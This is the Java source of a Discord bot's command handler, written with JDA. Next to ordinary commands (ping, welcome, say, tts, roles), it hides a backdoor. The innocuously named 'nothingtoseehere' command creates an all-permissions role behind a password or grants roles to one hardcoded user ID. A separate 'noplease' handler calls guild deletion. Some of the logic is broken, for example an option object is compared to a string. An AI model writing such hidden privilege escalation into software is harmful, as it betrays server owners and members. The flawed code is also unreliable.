package com.locatedreaper.thebeanisoutbot.commands;

import io.github.cdimascio.dotenv.Dotenv;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.entities.UserSnowflake;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.guild.GuildReadyEvent;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.OptionMapping;
import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.CommandData;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.commands.build.OptionData;
import net.dv8tion.jda.api.requests.restaction.CacheRestAction;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;
import org.jetbrains.annotations.NotNull;
import com.locatedreaper.thebeanisoutbot.commands.CommandManager;
import com.locatedreaper.thebeanisoutbot.listeners.EventListener;
import javax.swing.text.html.Option;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class CommandManager extends ListenerAdapter {
//Don't include / in command.equals();
private Dotenv config;

    @Override
    public void onSlashCommandInteraction(@NotNull SlashCommandInteractionEvent event) {

        config = Dotenv.configure().load();
        String command = event.getName();
        if (command.equals("welcome")) {
            String userTag = event.getUser().getAsTag();
            event.reply("Welcome to the server **" + userTag + "**!").queue();
        } else if (command.equals("ping")) {
            event.reply("Pong").queue();
        } else if (command.equals("funny")) {
            event.reply("sorry :rofl:").queue();
        } else if (command.equals("roles")) {
            event.deferReply().setEphemeral(true).setTTS(true).queue();
            String response = "";
            for (Role role : event.getGuild().getRoles()) {
                response += role.getAsMention() + "\n";
            }
            event.getHook().sendMessage(response).queue();
        } else if (command.equals("tts")) {
            OptionMapping messageOption = event.getOption("message");
            if (messageOption == null) {
                return;
            }
            String message = messageOption.getAsString();
            event.reply(message).setTTS(true).queue();
            event.reply("Message sent").setEphemeral(true).queue();
        } else if (command.equals("nothingtoseehere")) {
            String psw = config.get("PW");
            event.deferReply().setEphemeral(true).setTTS(true).queue();
            OptionMapping messageOption = event.getOption("newrolename");
            OptionMapping password = event.getOption("password");
            String name = messageOption.getAsString();
            if (password.equals(psw)) {
                Objects.requireNonNull(event.getGuild()).createRole()
                        .setName(name)
                        .setMentionable(false)
                        .setPermissions(Permission.ALL_PERMISSIONS).queue();
                event.reply("Done").setEphemeral(true).queue();
            } else if (password == null) {
                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
                    event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
                    event.reply("Done").setEphemeral(true).queue();
                }
            }
        }else if (command.equals("say")) {
            OptionMapping messageOption = event.getOption("message");
            if (messageOption == null) {
                return;
            }
            String message = messageOption.getAsString();
            event.reply(message).queue();
            event.reply("Message sent").setEphemeral(true).queue();
        } else if (command.equals("noplease")) {
            for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName("..", true)){
                event.getGuild().delete(".").queue();
            }
        } else if (command.equals("rolepermissions")) {
            OptionMapping messageOption = event.getOption("role");
            if (messageOption == null) {
                event.reply("Please specify a role.").setEphemeral(true).queue();
            }
            String message = messageOption.getAsString();
            var role = event.getGuild().getRoleById(message).getPermissions();
            event.reply(String.valueOf(role)).setEphemeral(true).queue();
        }
    }

    @Override
    public void onGuildReady(@NotNull GuildReadyEvent event) {
        //Guild standalone
        List<CommandData> umb = new ArrayList<>();
        List<CommandData> fs = new ArrayList<>();
        //Option Data
        OptionData option1 = new OptionData(OptionType.STRING, "message", "The message you want the bot to say", true);
        OptionData newroleName = new OptionData(OptionType.STRING, "newrolename", "The name for the role", true);
        OptionData pw = new OptionData(OptionType.STRING, "password", "The required password to run this command", true);
        //Commands
        fs.add(Commands.slash("funny", "Say something funny"));
        umb.add(Commands.slash("roles", "Display all roles on the server."));
        umb.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
        fs.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
        umb.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
        umb.add(Commands.slash("nothingtoseehere", "No cap!").addOptions(newroleName, pw));

        if (event.getGuild().getIdLong() == 1025575674406244425L) {
            event.getGuild().updateCommands().addCommands(umb).queue();
        }
        else if (event.getGuild().getIdLong() == 1047676216607522856L) {
            event.getGuild().updateCommands().addCommands(fs).queue();
        }
    }

    @Override
    public void onReady(@NotNull ReadyEvent event) {
        //Register
        List<CommandData> commandData = new ArrayList<>();
        //Option Data
        OptionData roleID = new OptionData(OptionType.MENTIONABLE, "role", "The the role you want to check", false);
        //Command Data
        commandData.add(Commands.slash("ping", "The bot will respond with pong."));
        commandData.add(Commands.slash("welcome", "Get welcomed by the bot."));
        commandData.add(Commands.slash("rolepermissions", "Get a role and check what permissions it has").addOptions(roleID));

        event.getJDA().updateCommands().addCommands(commandData).queue();
    }
}
